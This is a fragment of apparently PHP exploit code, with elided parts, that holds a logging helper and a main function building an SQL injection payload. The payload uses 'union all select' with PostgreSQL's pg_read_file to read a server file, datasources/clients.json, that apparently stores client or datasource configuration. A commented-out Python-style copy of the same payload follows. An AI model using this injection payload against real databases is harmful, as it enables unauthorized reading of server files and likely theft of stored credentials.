...
function log_to_file($content, $filename = null) {
    global $log_file;
    $filepath = $filename ? $filename : $log_file;

    // Check if the file path is not empty before logging
    if (!empty($filepath)) {
...
function main() {
    ...
    $version_payload = "nq['' union all select 'aa',(select pg_read_file('{$path}datasources/clients.json'))]";
	
	
	#$db_payload = f"nq['' union all select 'aa',(select pg_read_file('{path}datasources/clients.json'))]"
